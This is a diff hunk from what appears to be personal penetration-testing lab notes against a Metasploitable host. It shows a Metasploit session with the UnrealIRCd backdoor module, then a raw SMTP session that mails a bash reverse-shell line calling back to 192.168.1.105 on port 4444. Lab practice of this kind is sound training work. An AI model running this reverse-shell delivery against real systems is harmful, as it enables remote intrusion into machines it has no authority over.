@@ -204,3 +204,24 @@ msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 10.30.0.235
 RHOSTS => 10.30.0.235
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set 
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+20/05/2026
+
+***********************
+Trying 10.30.0.235...
+Connected to 10.30.0.235.
+Escape character is '^]'.
+220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+MAIL FROM:<frankie@gelos.com>
+250 2.1.0 Ok
+RCPT TO:<root@localhost>
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+#!/bin/bash
+bash -i>&                                                         
+/dev/tcp/192.168.1.105/4444
+0>&1
+.
+250 2.0.0 Ok: queued as 92A0FCBB9
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
